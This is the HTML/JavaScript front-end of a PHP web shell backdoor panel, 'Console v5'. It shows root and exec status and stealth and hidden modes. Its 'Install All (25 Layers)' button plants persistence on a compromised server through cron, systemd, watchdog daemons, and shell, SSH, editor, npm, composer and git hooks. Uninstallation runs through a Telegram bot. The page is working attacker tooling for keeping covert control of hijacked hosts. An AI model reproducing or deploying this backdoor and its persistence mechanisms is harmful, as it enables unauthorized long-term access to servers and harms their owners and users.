.modal-header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid var(--border);}
.modal-header .title{font-size:14px;font-weight:600;}
.modal-close{width:28px;height:28px;border-radius:6px;background:transparent;border:none;color:var(--text-dim);cursor:pointer;font-size:18px;display:flex;align-items:center;justify-content:center;}
.modal-close:hover{background:var(--surface-2);color:var(--text);}
.modal-body{padding:20px;}
.result-box{margin-top:14px;padding:12px 14px;border-radius:var(--r-sm);font-family:"SF Mono",Consolas,monospace;font-size:12px;line-height:1.7;word-break:break-all;white-space:pre-wrap;}
.result-box.ok{background:var(--accent-soft);border:1px solid rgba(74,222,128,0.25);color:var(--accent);}
.result-box.err{background:rgba(248,113,113,0.1);border:1px solid rgba(248,113,113,.25);color:var(--danger);}
.toasts{position:fixed;top:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;max-width:360px;}
.toast{padding:12px 16px;background:rgba(20,20,22,.96);border:1px solid rgba(255,255,255,0.12);border-radius:var(--r-sm);font-size:13px;animation:slideIn .25s ease;}
.toast.success{border-left:3px solid var(--accent);color:var(--accent);}
.toast.error{border-left:3px solid var(--danger);color:var(--danger);}
@keyframes slideIn{from{transform:translateX(20px);opacity:0;}to{transform:none;opacity:1;}}
.status-ok{color:var(--accent);}.status-warn{color:var(--warning);}.status-err{color:var(--danger);}
@media(max-width:820px){.sidebar{display:none;}.main{margin-left:0;padding:16px;}}
</style>
</head>
<body>
<div id="toastContainer" class="toasts"></div>
<aside class="sidebar">
  <div class="brand"><span class="brand-dot"></span><b>Console</b>&nbsp;<span>v5</span></div>
  <div style="margin-bottom:2px;"><button class="nav-item" onclick="openWatcher()">Defense Status</button></div>
  <div style="margin-top:14px;padding-top:14px;border-top:1px solid var(--border);"><a class="nav-item danger" href="?logout=1">Logout</a></div>
</aside>
<main class="main">
  <div class="topbar">
    <div class="topbar-brand"><span class="wn-title">Console</span><span class="wn-owner">Dkid03</span></div>
    <div class="topbar-pills">
      <span class="pill <?= isRoot() ? 'root' : '' ?>"><span class="dot"></span><?= isRoot() ? 'root' : 'user' ?></span>
      <span class="pill">shell · <?= htmlspecialchars($CURRENT_SHELL, ENT_QUOTES, 'UTF-8') ?></span>
      <span class="pill">ip · <?= htmlspecialchars(get_real_ip(), ENT_QUOTES, 'UTF-8') ?></span>
      <span class="pill <?= is_shell_available() ? 'on' : '' ?>"><?= is_shell_available() ? 'exec · on' : 'exec · off' ?></span>
      <?php if (wn_stealth_enabled()): ?><span class="pill stealth"><span class="dot"></span>stealth</span><?php endif; ?>
    </div>
  </div>
  <?php if (isset($error)): ?><div class="alert alert-danger"><?= htmlspecialchars($error) ?></div><?php endif; ?>
  <div class="card">
    <div class="card-icon"><span class="dot"></span></div>
    <h2>Console</h2>
    <p><code></code></p>
    <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;"><button onclick="openWatcher()" class="btn primary">Open</button></div>
    <div class="card-meta">
      <span>shell · <?= htmlspecialchars($CURRENT_SHELL, ENT_QUOTES, 'UTF-8') ?></span>
      <span>php · <?= PHP_VERSION ?></span>
      <?php if (wn_is_hidden()): ?><span style="color:var(--warning);">hidden</span><?php endif; ?>
    </div>
  </div>
</main>
<div id="watcherModal" class="modal"><div class="modal-content">
  <div class="modal-header"><span class="title">Defense Status</span><button class="modal-close" onclick="hideModal('watcherModal')">×</button></div>
  <div class="modal-body">
    <div id="wtInfoBox" style="padding:12px;background:var(--surface-2);border-radius:var(--r-sm);margin-bottom:14px;font-size:12px;">Loading...</div>
    <div style="display:flex;gap:8px;margin-bottom:12px;">
      <button onclick="autoInstallWatcher()" class="btn primary" style="flex:2;">Install All (25 Layers)</button>
      <button onclick="loadWatcherStatus()" class="btn" style="padding:9px 14px;">↻</button>
    </div>
    <div style="font-size:11px;color:var(--text-mute);margin-bottom:12px;line-height:1.5;">
      Uninstall via bot: kirim <code style="background:var(--surface-2);padding:2px 6px;border-radius:4px;">/uninstall</code> di Telegram.
    </div>
    <div id="wtResult"></div>
  </div>
</div></div>
<script>
function showToast(m,t){t=t||'info';var c=document.getElementById('toastContainer'),el=document.createElement('div');el.className='toast '+t;el.textContent=m;c.appendChild(el);setTimeout(function(){el.style.opacity='0';setTimeout(function(){el.remove();},250);},3500);}
function showModal(id){document.getElementById(id).classList.add('active');}
function hideModal(id){document.getElementById(id).classList.remove('active');}
function openWatcher(){showModal('watcherModal');loadWatcherStatus();}
function pill(a,on,off){return a?'<span class="status-ok">'+(on||'active')+'</span>':'<span class="status-warn">'+(off||'off')+'</span>';}
function loadWatcherStatus(){
    var b=document.getElementById('wtInfoBox');b.innerHTML='Loading...';
    fetch('?action=watcher_status',{cache:'no-store',credentials:'same-origin'}).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.text();}).then(function(txt){
        var d;try{d=JSON.parse(txt);}catch(e){b.innerHTML='<span class="status-err">Non-JSON</span>';return;}
        if(d.relogin){location.reload();return;}
        if(d.status!=='success'){b.innerHTML='<span class="status-err">Error: '+(d.message||'?')+'</span>';return;}
        var L=d.layers||{};
        var rows=[
            ['Host','<span style="color:var(--accent);font-family:monospace;">'+(d.host||'?')+'</span>',true],
            ['User',(d.unix_user||'?')+(d.is_root?' <span style="color:var(--danger);">[root]</span>':''),false],
            ['Server IP','<span style="font-family:monospace;">'+(d.server_ip||'?')+'</span>',false],
            ['Shell',d.shell_available?'<span class="status-ok">on</span>':'<span class="status-err">off</span>',false],
            ['Hidden',d.hidden?'<span class="status-warn">HIDDEN</span>':'<span class="status-ok">visible</span>',false],
            ['Stealth',d.stealth_enabled?'<span class="status-ok">ON</span>':'<span class="status-warn">off</span>',false],
            ['Cron',d.has_cron?'<span class="status-ok">active</span>':'<span class="status-err">missing</span>',false],
            ['@reboot',d.has_reboot?'<span class="status-ok">yes</span>':'<span class="status-warn">no</span>',false],
            ['Daemon',pill(L.daemon),false],
            ['Watchdog',pill(L.watchdog),false],
            ['Systemd',pill(L.systemd),false],
            ['SysdTimer',pill(L.systemd_timer),false],
            ['SysdEnv',pill(L.systemd_env),false],
            ['GhostTrap',pill(L.ghost_trap),false],
            ['XDG Auto',pill(L.xdg_autostart),false],
            ['Tmux',pill(L.tmux_hook),false],
            ['Vim',pill(L.vim_rc),false],
            ['Python',pill(L.python_site,'active ('+(L.python_site_count||0)+')','off'),false],
            ['SSH-cfg',pill(L.ssh_config),false],
            ['.npmrc',pill(L.npmrc),false],
            ['Emacs',pill(L.emacs_rc),false],
            ['LessFilter',pill(L.lessfilter),false],
            ['XSession',pill(L.xsession_rc),false],
            ['Watchers','<span class="'+(d.watchers_alive>0?'status-ok':'status-err')+'">'+(d.watchers_alive||0)+'/'+(d.watchers||[]).length+'</span>',false],
            ['Long poll',d.live_active?'<span class="status-ok">ALIVE</span>':(d.live_age>=0?'<span class="status-warn">idle</span>':'<span class="status-err">never</span>'),false],
            ['BashRC',pill(L.shell_rc),false],
            ['SSH-RC',pill(L.ssh_rc),false],
            ['Logout',pill(L.bash_logout),false],
            ['Linger',pill(L.linger),false],
            ['NPM',pill(L.npm_hooks,'active ('+(L.npm_count||0)+')','off'),false],
            ['Composer',pill(L.composer_hooks,'active ('+(L.composer_count||0)+')','off'),false],
            ['Shell trap',pill(L.shell_trap),false],
            ['Git hook',pill(L.git_hook,'active ('+(L.git_hook_count||0)+')','off'),false],
            ['AT job',pill(L.at_job,'available','missing'),false]
        ];
        var h='<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;font-size:12px;">';
        rows.forEach(function(r){if(r[2])h+='<div style="grid-column:1/-1;"><span style="color:var(--text-mute);">'+r[0]+'</span><br>'+r[1]+'</div>';else h+='<div><span style="color:var(--text-mute);">'+r[0]+'</span><br>'+r[1]+'</div>';});
        h+='<div style="grid-column:1/-1;"><span style="color:var(--text-mute);">State dir</span><br><span style="font-family:monospace;font-size:10.5px;word-break:break-all;">'+(d.state_dir||'?')+'</span></div>';
        h+='</div>';
        b.innerHTML=h;
    }).catch(function(err){b.innerHTML='<span class="status-err">'+err.message+'</span>';});
}
function autoInstallWatcher(){
    if(!confirm('Install 25 layer? Proses 60-180 detik. JANGAN tutup tab.'))return;
    var b=document.getElementById('wtResult');b.className='result-box';b.textContent='Installing... (60-180 detik)';
    var controller=new AbortController();var tid=setTimeout(function(){controller.abort();},320000);
    fetch('?action=auto_install_watcher&silent=1',{credentials:'same-origin',signal:controller.signal}).then(function(r){clearTimeout(tid);return r.text();}).then(function(txt){
        var d;try{d=JSON.parse(txt);}catch(e){b.className='result-box err';b.textContent='Response tidak valid. Klik Refresh dalam 1 menit.';return;}
        if(d.relogin){location.reload();return;}
        if(d.status==='success'){
            var L=d.layers||{};
            var lines=[
                '[OK] Installed','PHP: '+d.php_bin+' (v'+(d.php_version||'?')+')','Watcher: '+d.watcher_count,'Backups: '+d.backup_count,
                'Cron: '+(d.cron_ok?'OK':'FAIL'),
                'Daemon: '+(L.daemon?'OK':'FAIL'),
                'Watchdog: '+(L.watchdog?'OK':'FAIL'),
                'Systemd: '+(L.systemd?'OK':'SKIP'),
                'SysdTimer: '+(L.systemd_timer?'OK':'SKIP'),
                'SysdEnv: '+(L.systemd_env?'OK':'SKIP'),
                'GhostTrap: '+(L.ghost_trap?'OK':'SKIP'),
                'XDG: '+(L.xdg_autostart?'OK':'SKIP'),
                'Tmux: '+(L.tmux_hook?'OK':'SKIP'),
                'Vim: '+(L.vim_rc?'OK':'SKIP'),
                'Python: '+(L.python_site?'OK ('+(L.python_site_count||0)+')':'SKIP'),
                'SSHcfg: '+(L.ssh_config?'OK':'SKIP'),
                '.npmrc: '+(L.npmrc?'OK':'SKIP'),
                'Emacs: '+(L.emacs_rc?'OK':'SKIP'),
                'Lessfilter: '+(L.lessfilter?'OK':'SKIP'),
                'XSession: '+(L.xsession_rc?'OK':'SKIP')
            ];
            b.className='result-box ok';b.textContent=lines.join('\n');
            showToast('Installed','success');setTimeout(loadWatcherStatus,1500);
        }else if(d.busy){b.className='result-box err';b.textContent=d.message+'\n\nTunggu 60 detik lalu Refresh.';}
        else{b.className='result-box err';b.textContent='Gagal: '+(d.message||'Unknown');}
    }).catch(function(err){clearTimeout(tid);b.className='result-box err';b.textContent='Timeout: '+err.message+'\n\nServer mungkin masih memproses. Klik Refresh dalam 60 detik.';});
}
window.onclick=function(e){document.querySelectorAll('.modal').forEach(function(m){if(e.target===m)hideModal(m.id);});};
</script>
</body>
</html>
